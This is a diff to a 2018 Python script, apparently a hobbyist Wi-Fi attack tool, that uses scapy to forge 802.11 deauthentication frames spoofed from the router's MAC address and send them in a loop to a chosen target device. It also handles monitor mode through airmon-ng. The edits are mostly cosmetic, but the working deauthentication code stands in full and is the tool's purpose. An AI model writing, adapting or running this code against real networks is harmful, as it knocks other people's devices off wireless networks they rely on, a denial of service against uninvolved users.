@@ -3,17 +3,32 @@
 # author = Jesse
 # date = 9/28/2018
 
-from scapy.all import *
-from termcolor import colored
-import subprocess
-import os
-import sys
-import operator
-import urllib2
+
+# try to import the needed modules
+try:
+	from scapy.all import *
+	from termcolor import colored
+	import subprocess
+	import os
+	import sys
+	import urllib2
+
+# handling ImportError
+except ImportError:
+	# cannot print colored text because user might not have module for this installed		
+	print('requirements arent properly statisfied!')
+	sys.exit()
+
+except KeyboardInterrupt:
+	# cannot print colored text because user might not have the module for this installed
+	print('requested shutdown...')
+	sys.exit()
+
 
 
 
 # defining variables 
+
 
 # for cleaner errors
 sys.tracebacklimit=0
@@ -25,9 +40,7 @@ router_ip = subprocess.check_output('ip route', shell=True)
 local_ip = subprocess.check_output('ifconfig | grep inet', shell=True)
 
 
-# defining the screen width for later printing
-SCREEN_WIDTH = 110
-centered = operator.methodcaller('center', SCREEN_WIDTH)
+
 
 
 # functions starting here
@@ -57,7 +70,7 @@ def check_connection():
 		# time.sleep for the looks
 		time.sleep(0.7)
 
-		print(colored('\n[!]', 'red')),
+		print(colored('\n[*]', 'red')),
 		print('exiting...')
 
 		# time.sleep for the looks
@@ -327,15 +340,22 @@ def getofmynetwork():
 			packet = RadioTap()/Dot11(type=0,subtype=12,addr1=target_mac,addr2=router_mac,addr3=router_mac)/Dot11Deauth(reason=7)
 			# for loop for sending deauth packets
 			for n in range(int(amount)):
+				
+				# used in the for loop for sending the deauthentication packets
+				packet_num = 0
+				# sending the packet
 				sendp(packet)
 				print(colored('[+]', 'red')),
-				print('deauthentication packets are being sent to ' + target_mac)
-			
-			
+				print('packets are being sent to ' + target_mac)
+
+			# done!
+			print(colored('[+]', 'red')),
+			print('done sending packets!')
+
 			time.sleep(1)
 
 			# checks if interface is in monitor mode
-			# check if the script went until the assignment of the mon variable,
+			# check if the script went until the assignment of the monInterface variable,
 			# if it did, your interface should be set into monitor mode
 			if monInterface[-3:] == 'mon':
 				print(colored('[*]', 'red')),
@@ -379,4 +399,14 @@ def getofmynetwork():
 				print('done!')
 
 
+
 getofmynetwork()
+
+# if anything goes wrong and python exits the function monitor mode will still be stopped
+# if monitor mode has already been stopped this wont harm your network interface
+
+# stopping monitor mode on interface
+stop_mon_mode = subprocess.check_output('airmon-ng stop ' + monInterface, shell=True)
+	
+# hide the stop_mon_mode output to keep the shell clean			
+print(stop_mon_mode[0:0])
